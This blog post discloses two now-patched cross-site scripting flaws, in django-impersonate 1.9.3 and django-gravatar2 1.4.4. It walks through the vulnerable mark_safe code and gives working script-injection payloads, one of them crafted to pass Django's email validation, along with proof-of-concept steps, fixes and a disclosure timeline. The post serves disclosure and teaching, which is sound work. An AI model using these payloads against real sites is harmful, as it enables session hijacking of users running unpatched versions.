.. title: XSS in django-impersonate 1.9.3 and django-gravatar2 1.4.4
.. date: 2025-02-08
.. category: security, python, django
.. tags: security, python, django, xss
.. description: Details about two cross-site scripting vulnerabilities that I reported to django-impersonate and django-gravatar2.

This post details two cross-site scripting (XSS) vulnerabilities I discovered in `django-impersonate <https://pypi.org/project/django-impersonate/>`__,
and `django-gravatar2 <https://pypi.org/project/django-gravatar2/>`__.
I'm writing about them together because they share the same vulnerability,
and are similar in other aspects that I'll explain below.

.. contents:: Contents
   :depth: 2
   :local:
   :backlinks: none

Background
----------

At `Read the Docs <https://about.readthedocs.com/>`__, we use both packages.
While waiting for my PRs to be reviewed, and taking a break from coding,
I decided to do a quick security audit of some of our dependencies,
since both packages have a relatively small codebase,
they were good candidates for a quick review.

django-impersonate
------------------

`django-impersonate <https://pypi.org/project/django-impersonate/>`__ allows you to impersonate other users,
really useful for debugging and support.

The vulnerability
~~~~~~~~~~~~~~~~~

After grepping the codebase for common vulnerable patterns,
I found `this line of code <https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/helpers.py?rev=fa5d1a703960#L28>`__ that caught my attention:

.. code-block:: python

   def get_redir_field(request):
       redirect_field_name = settings.REDIRECT_FIELD_NAME
       if redirect_field_name:
           nextval = request.GET.get(redirect_field_name, None)
           if nextval:
               return mark_safe(
                  u'<input type="hidden" name="{0}" value="{1}"/>'.format(
                     redirect_field_name, nextval,
                  )
               )
       return u''

You can see that the application is building an HTML input field with the value of a query parameter (if the ``IMPERSONATE["REDIRECT_FIELD_NAME"]`` setting is defined),
and marking it as safe with `mark_safe <https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.safestring.mark_safe>`__
(Django won't escape it when including it in a template).
The problem arises as the query parameter is controlled by the user, and isn't escaped before being included in the string.

Exploitation
~~~~~~~~~~~~

Identified the vulnerable code, the next step was to find a way to exploit it.
Searching for the usage of the ``get_redir_field`` function,
I found it was used in two views related to listing users:

- `/impersonate/views.py:106 (list_users) <https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/views.py?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L106>`__
- `/impersonate/views.py:134 (search_users) <https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/views.py?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L134>`__

But only the `template <https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/templates/impersonate/search_users.html?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L11>`__
rendered from the ``search_users`` view includes the result of the ``get_redir_field`` function.

.. code-block:: python

   # impersonate/views.py (search_users)
   return render(
       request,
       template,
       {
           'users': users,
           'paginator': paginator,
           'page': page,
           'page_number': page_number,
           'query': query,
           'redirect': get_redir_arg(request),
           'redirect_field': get_redir_field(request),
       },
   )

.. code-block:: html

   <!-- impersonate/templates/impersonate/search_users.html -->
   <form action="{% url 'impersonate-search' %}" method="GET">
      Enter Search Query:<br />
      <input type="text" name="q" value="{% if query %}{{ query }}{% endif %}"><br />
      {{redirect_field}}
      <input type="submit" value="Search"><br />
   </form>

Assuming the application defined the ``IMPERSONATE["REDIRECT_FIELD_NAME"]`` setting as ``next``,
the URL used to exploit the vulnerability would be ``/impersonate/search/?next={payload}``.
Where ``{payload}`` can be:

.. code-block:: html

   "/><script>alert(document.domain)</script><input type="hidden

What this does is:

- Uses a ``"/>`` to close the ``input`` tag.
- Injects a script that shows an alert with the current domain.
- Opens a new tag so the rest of the HTML is not shown as broken.

The payload injected into the template would look like this:

.. code-block:: html

   <input type="hidden" name="next" value="">
   <script>alert(document.domain)</script>
   <input type="hidden"/>

Proof of concept
~~~~~~~~~~~~~~~~

I created a `proof of concept <https://github.com/stsewd/poc-xss-django-impersonate>`__ to demonstrate the vulnerability, so you can see it in action,
you just need to have Python and `uv <https://docs.astral.sh/uv/getting-started/installation/>`__ installed:

It consists of a simple Django project with ``django-impersonate==1.9.3`` installed,
with the ``IMPERSONATE["REDIRECT_FIELD_NAME"]`` setting defined as ``next``.

.. code-block:: bash

   $ git clone https://github.com/stsewd/poc-xss-django-impersonate
   $ cd poc-xss-django-impersonate
   $ uv run manage.py migrate
   # Create a user to log into the application.
   $ uv run manage.py createsuperuser
   $ uv run manage.py runserver

- Go to ``http://127.0.0.1:8000/admin/login/``
- Log in with the user you created
- Go to ``http://127.0.0.1:8000/impersonate/search/?next=?next="><script>alert(document.domain)</script><input type="hidden``
- A pop-up with the domain of the page should appear

Showing an alert is just a simple example,
but an attacker can execute any JavaScript code in the context of the user's session.

Mitigation
~~~~~~~~~~

You should never use ``mark_safe`` with user-controlled content,
if you need to build HTML with user-controlled data outside of a template,
you can use the `format_html <https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.format_html>`__ function,
as you can see in the two commits that fixed the vulnerability:
`06991a735f29 <https://hg.code.netlandish.com/~petersanchez/django-impersonate/rev/06991a735f290884eec08effb3fa31ed45cc26e5>`__,
`33cb8c77262a <https://hg.code.netlandish.com/~petersanchez/django-impersonate/rev/33cb8c77262a474869ab94bcb82c5446baf3c228>`__.

Timeline
~~~~~~~~

- **11/06/2024**: Found and reported the vulnerability to the maintainer.
- **13/06/2024**: Maintainer replied and confirmed the vulnerability.
- **14/06/2024**: Maintainer released version 1.9.4 with the fix.

django-gravatar2
----------------

`django-gravatar2 <https://pypi.org/project/django-gravatar2/>`__ allows you to integrate `Gravatar <https://gravatar.com/>`__ in your project,
so you can show the user's avatar based on their email.

The vulnerability
~~~~~~~~~~~~~~~~~

After grepping the codebase for common vulnerable patterns,
I found this code that caught my attention:

.. raw:: html

   <iframe frameborder="0" scrolling="no" style="width:100%; height:457px;" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.com%2Ftwaddington%2Fdjango-gravatar%2Fblob%2Fed123f849b5207e11efdfb1b2b0235baa41df356%2Fdjango_gravatar%2Ftemplatetags%2Fgravatar.py%23L24-L41&style=default&type=code&showBorder=on&showLineNumbers=on&showFileMeta=on&showFullPath=on&showCopy=on"></iframe>

You can see that the application is building an HTML ``img`` tag with several attributes,
like CSS class, alt text, size, and the URL of the Gravatar image,
and marking it as safe with `mark_safe <https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.safestring.mark_safe>`__
(Django won't escape it when including it in a template).
Of all these attributes, only the URL is being `escaped <https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.escape>`__,
all other values are used as is.

I found that the function is used as a `template tag <https://docs.djangoproject.com/en/4.2/howto/custom-template-tags/>`__ to render the Gravatar image:

.. raw:: html

   <iframe frameborder="0" scrolling="no" style="width:100%; height:100px;" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.com%2Ftwaddington%2Fdjango-gravatar%2Fblob%2Fed123f849b5207e11efdfb1b2b0235baa41df356%2Fdjango_gravatar%2Ftemplatetags%2Fgravatar.py%23L56&style=default&type=code&showBorder=on&showLineNumbers=on&showFileMeta=on&showFullPath=on&showCopy=on"></iframe>

For example, you can use it in a template like this:

.. code-block:: html

   {% load gravatar from gravatar %}

   {% gravatar user 50 "User profile" %}

In this example, the size and the alt text are hardcoded,
so there is no way for an attacker to inject arbitrary HTML or JavaScript code.
But what happens if the size or alt text come from the user?
Then we have a problem, as the values are not escaped before being included in the template.

.. code-block:: html

   {% load gravatar from gravatar %}

   {% gravatar user 50 user.name %}

Exploitation
~~~~~~~~~~~~

Since the vulnerability is in a template tag,
exploiting the vulnerability will depend if an application uses the template tag with user-controlled content.
We can assume that a common alt text is the user's name.

.. code-block:: html

   {% load gravatar from gravatar %}

   {% gravatar user 50 user.name %}

Then the attacker can inject the payload in the user's name.
A simple payload could be:

.. code-block:: html

   "/><script>alert(document.domain)</script><img src="

What this does is:

- Uses a ``"/>`` to close the ``img`` tag.
- Injects a script that shows an alert with the current domain.
- Opens a new tag so the rest of the HTML is not shown as broken.

The payload injected into the template would look like this:

.. code-block:: html

   <img class="gravatar" src="https://www.gravatar.com/" width="50" height="50" alt=""/>
   <script>alert(document.domain)</script>
   <img src="" />

But that's too simple and very similar to the previous example,
so let's assume that the application uses the user's email as the alt text instead.

.. code-block:: html

   {% load gravatar from gravatar %}

   {% gravatar user 50 user.email %}

You may think that's the same as the previous example,
but since the email is used as the alt text, the payload needs to be a valid email.
And if you try to create an email with the previous payload, it won't work,
as the Django user model will validate the email format.

Making the payload a valid email is not as simple as just adding ``@example.com`` at the end,
as the part before the ``@`` (local part) can't contain special characters like ``"<>()``,
which are needed to inject the payload.

Luckily, the `spec says that the local part can contain any ASCII graphic if it's quoted <https://en.wikipedia.org/wiki/Email_address#Local-part>`__,
and coincidentally, our payload has already quotes around it, so it's just a matter adding ``@example.com`` at the end!
Or almost... Django's email validator does allow the local part to be quoted, but it doesn't allow spaces,
luckily HTML is very forgiving, so we can add almost anything instead of the spaces, and our payload will still work

.. code-block:: html

   "/><script>alert(document.domain)</script><img/src="@example.com

You could also leave the tag unclosed, but that will break the rest of the HTML in the template.

.. code-block:: html

   "/><script>alert(document.domain)</script>"@example.com

Proof of concept
~~~~~~~~~~~~~~~~

I created a `proof of concept <https://github.com/stsewd/poc-xss-django-gravatar2>`__ to demonstrate the vulnerability, so you can see it in action,
you just need to have Python and `uv <https://docs.astral.sh/uv/getting-started/installation/>`__ installed:

It consists of a simple Django project with ``django-gravatar2==1.4.4`` installed,
it shows the Gravatar of a user given its email.

.. code-block:: bash

   $ git clone https://github.com/stsewd/poc-xss-django-gravatar2
   $ cd poc-xss-django-gravatar2
   $ uv run manage.py migrate
   $ uv run manage.py runserver

- Go to ``http://127.0.0.1:8000/``
- In the form enter ``"/><script>alert(document.domain)</script><img src="`` as the name,
  or ``"/><script>alert(document.domain)</script><img/src="@example.com`` as the email.
- Click on the "Submit" button
- A pop-up with the domain of the page should appear

Showing an alert is just a simple example,
but an attacker can execute any JavaScript code in the context of the user's session.

Mitigation
~~~~~~~~~~

As the previous vulnerability,
you should never use ``mark_safe`` with user-controlled content,
if you need to build HTML with user-controlled data outside of a template,
you can use the `format_html <https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.format_html>`__ function.

.. note::

   The maintainer chose to `escape the alt text only <https://github.com/twaddington/django-gravatar/commit/b08820112f062b40521c6f07fb9657f4204f6cf1>`__,
   as he considered the size and CSS class should be validated by the developer.
   If you are using the ``gravatar`` template tag with user-controlled content
   in the size or CSS class, you should escape it as show in the following example:

   .. code-block:: html

      {% load gravatar from gravatar %}

      {% gravatar user size|escape "User profile" class|escape %}

Timeline
~~~~~~~~

- **21/06/2024**: Found and reported the vulnerability to the maintainer.
- **21/06/2024**: Maintainer replied and confirmed the vulnerability.
- **29/08/2024**: Maintainer released version 1.4.5 with the fix.

More in common than you think
-----------------------------

Apart from sharing the same vulnerability, there are other similarities between the two packages:

- Widely used packages.
  At the time of writing, `django-impersonate had 220K downloads in the last month <https://pypistats.org/packages/django-impersonate>`__,
  and `django-gravatar2 had 32K downloads in the last month <https://pypistats.org/packages/django-gravatar2>`__.
- Mostly maintained by a single person.
- Not actively maintained.

While the functionality that both packages provide is very specific,
they may be considered complete and stable without the need for active development.
But as with any software, there is always room for improvement,
or updates to keep up with the latest versions of Python and Django.

If you or your company use these packages,
please consider contributing to them in any way you can.
Another thing these packages have in common is that they are looking for maintainers,
so if you have the time and knowledge, consider helping them.

Acknowledgements
----------------

- Thanks to `Peter Sanchez <https://petersanchez.com/>`__ (maintainer of django-impersonate),
  and `Tristan Waddington <https://github.com/twaddington>`__ (maintainer of django-gravatar2)
  for their quick responses and fixes.
- It's also great I have the support at Read the Docs to spend part of my work time on security audits on packages we use.
  Even if the vulnerabilities don't affect our systems directly,
  it's nice to have the chance to give back to the community.
